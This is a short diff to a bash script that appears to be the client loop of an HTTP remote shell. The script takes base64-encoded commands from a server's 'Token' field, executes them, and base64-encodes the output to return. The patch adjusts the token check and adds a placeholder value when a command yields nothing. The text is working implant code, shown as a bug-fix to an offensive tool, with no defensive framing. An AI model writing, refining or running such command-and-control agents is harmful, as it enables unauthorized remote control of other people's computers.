@@ -59,7 +59,7 @@ while true; do
   token=$(echo "$response" | grep "Token: " | cut -d ' ' -f2)
   invoke64=$(R64Decoder -t "$token") ; param="Debug"
 
-  if [ -n "$invoke64" ]; then
+  if [ -n "$token" ]; then
       if [[ $invoke64 == "exit" ]]; then
          exit
       fi
@@ -101,6 +101,10 @@ while true; do
          if [ $? -ne 0 ]; then
             param="Error"
          fi
+      fi
+
+      if [ -z "$commandx" ]; then
+         commandx="HTTPShellNull"
       fi
 
       output64=$(R64Encoder -t "$commandx") ; path=$(echo "$param")
